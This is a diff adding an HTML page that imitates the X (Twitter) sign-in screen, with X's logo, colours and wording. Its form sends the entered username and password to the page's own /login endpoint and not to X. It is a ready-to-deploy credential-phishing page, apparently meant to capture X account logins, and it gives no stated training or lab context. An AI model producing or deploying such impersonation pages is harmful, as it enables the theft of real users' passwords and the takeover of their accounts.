@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login to X</title>
+  <link rel="stylesheet" href="/static/twitter.css">
+  <style>
+    body {
+      background-color: #000;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .x-login-box {
+      background-color: #111;
+      padding: 30px;
+      border-radius: 12px;
+      width: 360px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(255,255,255,0.1);
+    }
+    .x-logo {
+      font-size: 30px;
+      color: #1DA1F2;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #333;
+      border-radius: 6px;
+      background-color: #222;
+      color: #fff;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1DA1F2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0c86d1;
+    }
+    .note {
+      font-size: 12px;
+      margin-top: 12px;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+  <div class="x-login-box">
+    <div class="x-logo">𝕏</div>
+    <h2>Sign in to X</h2>
+    <form method="POST" action="/login">
+      <input type="text" name="username" placeholder="Phone, email, or username" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
+    <div class="note">New to X? <a href="https://x.com/i/flow/signup" style="color:#1DA1F2;">Create account</a></div>
+  </div>
+</body>
+</html>
